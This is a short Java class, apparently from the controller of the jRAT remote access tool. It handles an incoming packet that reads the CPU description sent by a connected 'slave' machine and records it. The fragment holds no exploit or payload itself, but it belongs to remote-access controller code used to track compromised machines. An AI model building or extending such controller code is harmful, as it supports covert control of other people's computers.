package io.jrat.controller.packets.incoming;

import io.jrat.controller.Slave;
import java.io.DataInputStream;

public class Packet19InitCPU extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String cpu = slave.readLine();
		slave.setCPU(cpu);
	}

}
